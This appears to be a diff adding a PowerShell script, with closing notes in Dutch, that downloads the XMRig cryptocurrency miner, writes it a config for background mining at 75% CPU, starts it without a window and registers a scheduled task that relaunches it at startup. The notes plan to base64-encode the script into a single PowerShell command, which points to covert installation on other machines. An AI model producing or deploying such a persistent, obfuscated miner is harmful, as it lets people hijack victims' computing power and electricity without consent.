@@ -1,0 +1,48 @@
+Invoke-WebRequest -Uri https://github.com/xmrig/xmrig/releases/download/v6.19.2/xmrig-6.19.2-msvc-win64.zip -OutFile xmrig.zip
+Expand-Archive xmrig.zip -DestinationPath C:\path\to\destination\
+
+$jsoncontent = @"
+{
+    "autosave": true,
+    "cpu": true,
+    "algo": "rx/0",
+    "donate-level": 1,
+    "pools": [
+        {
+            "url": "",
+            "user": "",
+            "pass": "X",
+            "keepalive": true,
+            "tls": true
+        }
+    ],
+    "http": {
+        "enabled": true,
+        "host": "0.0.0.0",
+        "port": 0,
+        "acces-token": "wopper",
+        "restricted": true
+    },
+    "background": true,
+    "max-cpu-usage": 75,
+    "randomx": {
+        "innit": -1,
+        "mode": "fast",
+        "1gb-pages": true
+    }
+
+
+}
+"@
+Set-Content -Path "C:\path\to\destination\config.json" -Value $jsonContent
+
+Start-Process "C:\path\to\destination\xmrig.exe" -ArgumentList "--config=C:\path\to\destination\config.json" -NoNewWindow
+
+$action = New-ScheduledTaskAction -Execute "C:\path\to\destination\xmrig.exe" -Argument "--config=C:\path\to\destination\config.json"
+$trigger = New-ScheduledTaskTrigger -AtStartup
+Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "XMRigMiner" -Description "start miner"
+
+
+
+dit script encode met een powershell command (base64) en dan die encode gebruiken
+destinations moeten nog worden aangepast
